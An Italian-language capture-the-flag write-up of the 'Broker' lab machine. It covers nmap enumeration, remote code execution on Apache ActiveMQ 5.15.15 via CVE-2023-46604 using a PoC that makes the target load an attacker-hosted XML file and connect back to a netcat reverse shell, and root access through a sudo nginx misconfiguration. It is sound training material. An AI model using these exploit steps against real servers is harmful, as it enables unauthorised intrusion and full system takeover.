---
title: "Broker Walkthrough"
description: "Broker è una macchina Linux easy che ospita una versione di Apache ActiveMQ. L’enumerazione della versione di Apache ActiveMQ rivela che è vulnerabile a Unauthenticated Remote Code Execution, vulnerabilità sfruttata per ottenere accesso user sulla macchina target. L’enumerazione post-exploitation rivela una misconfigurazione di sudo che permette all’utente activemq di eseguire sudo /usr/sbin/nginx; questa falla, analoga a quanto riscontrato nel recente disclosure Zimbra, viene sfruttata per ottenere l’accesso root."
author: dua2z3rr
date: 2025-09-05 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Common Applications", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Web Application", "Area di Interesse: Vulnerability Assessment","Vulnerabilità: Remote Code Execution", "Vulnerabilità: Misconfiguration", "Servizio: Apache", "Servizio: NGINX", "Tecnica: Reconnaissance", "Tecnica: Exploit Modification", "Tecnica: System Exploitation", "Tecnica: SUDO Exploitation", "Tecnica: Privilege Abuse"]
image: /assets/img/broker/broker-resized.png"
---

## Enumerazione Esterna

### Nmap

```shell
─[dua2z3rr@parrot]─[~/Boxes/broker]
└──╼ $sudo nmap -vv -p- 10.10.11.243
<SNIP>
PORT      STATE SERVICE     REASON
22/tcp    open  ssh         syn-ack ttl 63
80/tcp    open  http        syn-ack ttl 63
1883/tcp  open  mqtt        syn-ack ttl 63
5672/tcp  open  amqp        syn-ack ttl 63
8161/tcp  open  patrol-snmp syn-ack ttl 63
36651/tcp open  unknown     syn-ack ttl 63
61613/tcp open  unknown     syn-ack ttl 63
61614/tcp open  unknown     syn-ack ttl 63
61616/tcp open  unknown     syn-ack ttl 63

<SNIP>

┌─[dua2z3rr@parrot]─[~/Boxes/broker]
└──╼ $sudo nmap -vv -p 22,80,1883,5672,8161,36651,61613,61614,61616 -sC -sV 10.10.11.243
<SNIP>
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt       syn-ack ttl 63
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?      syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open  http       syn-ack ttl 63 Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
36651/tcp open  tcpwrapped syn-ack ttl 63
61613/tcp open  stomp      syn-ack ttl 63 Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       syn-ack ttl 63 Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title.
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Jetty(9.4.39.v20210325)
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
61616/tcp open  apachemq   syn-ack ttl 63 ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5672-TCP:V=7.94SVN%I=7%D=9/5%Time=68BA995E%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x1
SF:0\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x
SF:01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20c
SF:lient\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"
SF:AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\x
SF:a1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\
SF:x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\
SF:x20unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\
SF:0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\
SF:0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp
SF::decode-error\xa17Connection\x20from\x20client\x20using\x20unsupported\
SF:x20AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\
SF:0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\
SF:x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17
SF:Connection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempt
SF:ed")%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x1
SF:9\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\
SF:0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connec
SF:tion\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r
SF:(DNSStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0
SF:\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\
SF:x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x2
SF:0from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSes
SF:sionReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\x
SF:c0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\
SF:0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20clie
SF:nt\x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCooki
SF:e,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c
SF:\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d
SF:\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20
SF:using\x20unsupported\x20AMQP\x20attempted");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61613-TCP:V=7.94SVN%I=7%D=9/5%Time=68BA9959%P=x86_64-pc-linux-gnu%r
SF:(HELP4STOMP,27F,"ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STO
SF:MP\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Proto
SF:colException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apac
SF:he\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Prot
SF:ocolConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.st
SF:omp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n
SF:\tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(
SF:TransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.
SF:tcp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache
SF:\.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)
SF:\n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port61616-TCP:V=7.94SVN%I=7%D=9/5%Time=68BA9959%P=x86_64-pc-linux-gnu%r
SF:(NULL,140,"\0\0\x01<\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\x1
SF:1TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\x
SF:05\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled\x
SF:01\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x14
SF:TightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\x
SF:15MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationIni
SF:talDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15\.15");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Analizziamo l'output di nmap. Possiamo notare ssh e http (nginx) sulla porta 80. Interessante la porta 1883, porta di default per il protocollo `mqtt`. Dalle informazioni ottenute dagli script vediamo che l'ultimo topic riguarda `ActiveMQ/Advisory/Consumer/Topic/#`. Notiamo la porta 5672, con amqp (utilizzato da rabbitMQ) e la porta 8161, una altra porta http con `Jetty 9.4.39.v20210325`. STOMP è presente sulla porta 61613 e un'altra porta con numero 61614 con servizio http, sempre con Jetty. Infine, come detto prima, il servizio di apachemq (`ActiveMQ OpenWire transport`) sulla porta 61616 con versione 5.15.15.

> Il protocollo `mqtt` è un protocollo NON CRIPTATO e quindi NON SICURO per connessioni MQTT. Quest'ultimo significa Queuing Telemetry Transport protocol ed è un protocollo lightweight per i dispositivi IoT.
{: .prompt-info }

### HTTP

Procediamo ad andare sulla porta 80.

![Desktop View](/assets/img/broker/broker-porta-80.png)

Veniamo presentati da una semplice login page con http. Prima di provare a fare brute-force con hydra o medusa, enumeriamo ulteriormente le altre porte e controlliamo per vulnerabilità Pre-Auth.

Le altre porte non ci reindirizzano da nessun'altra parte. Cerchiamo per degli exploit.

### Ricerca Exploit

![Desktop View](/assets/img/broker/broker-CVE-ActiveMQ.png)

Questa fa al caso nostro. Cerchiamo una PoC.

![Desktop View](/assets/img/broker/broker-CVE-Activemq-PoC.png)

### Exploit

Utilizziamo l'exploit:

Prima di tutto, dobbiamo modificare il file poc-linux.xml e modificare la riga numero 11 inserendo il nostro indirizzo IP.

![Desktop View](/assets/img/broker/broker-poc-linux-xml.png)

Poi, avviamo un server http con python3...

```shell
┌─[✗]─[dua2z3rr@parrot]─[~/Boxes/broker/CVE-2023-46604]
└──╼ $python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

... e una porta in ascolto per la reverse shell con nc.

```shell
┌─[dua2z3rr@parrot]─[~/Desktop]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
```

Avviamo ora l'exploit.

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/broker/CVE-2023-46604]
└──╼ $go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.16.9:8000/poc-linux.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.16.9:8000/poc-linux.xml

[*] Sending packet: 000000771f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010024687474703a2f2f31302e31302e31362e393a383030302f706f632d6c696e75782e786d6c
```

Controlliamo la reverse shell.

```shell
┌─[dua2z3rr@parrot]─[~/Desktop]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.243 42396
bash: cannot set terminal process group (904): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ whoami
whoami
activemq
```

Prendiamo la user flag.

## Shell come activemq

### Enumerazione Interna

Come primo comando, controlliamo i binaries che possiamo eseguire come qualsiasi user attraverso `sudo -l`.

```shell
activemq@broker:~$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Possiamo eseguire come root `/usr/sbin/nginx`. Che versione era il sito? Ricontrolliamo l'output di nmap:

```shell
<SNIP>
80/tcp    open  http       syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
<SNIP>
```

Si tratta della versione 1.18.0

### Ricerca Exploit

<https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406>

Questo exploit automizzato fa al caso nostro. 

### Exploit

Passiamlo l'exploit alla macchina compromessa e utilizziamo l'exploit.

> Le chiavi ssh devono avere i permessi giusti e una passphrase, se no l'exploit non funzionerà.
{: .prompt-warning }

Copiamo la chiave privata e incolliamola sulla nostra macchina. Ora usiamo ssh per loggare come root sulla macchina compromessa.

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/broker]
└──╼ $ssh root@10.10.11.243 -i chiave_temp2
Enter passphrase for key 'chiave_temp2': 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Sep  5 09:43:47 AM UTC 2025

  System load:           0.0
  Usage of /:            70.8% of 4.63GB
  Memory usage:          11%
  Swap usage:            0%
  Processes:             161
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.243
  IPv6 address for eth0: dead:beef::250:56ff:fe94:77cf

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@broker:~# ls -al
total 36
drwx------  5 root root 4096 Sep  5 07:58 .
drwxr-xr-x 18 root root 4096 Nov  6  2023 ..
lrwxrwxrwx  1 root root    9 Apr 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 27  2023 .cache
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Sep  5 09:42 .ssh
-rwxr-xr-x  1 root root  517 Nov  7  2023 cleanup.sh
-rw-r-----  1 root root   33 Sep  5 07:58 root.txt
```

Prendiamo la root flag e terminiamo la box.

## Metodo alternativo per la privilege escalation

Il metodo alternativo sarebbe fare quello che fa lo script in modo manuale, quindi creare manualmente il file di configurazione temporaneo e poi creare le chiavi ssh dopo esserci collegati alla porta creata attraverso nginx. Infine, il procedimento è lo stesso dello script.
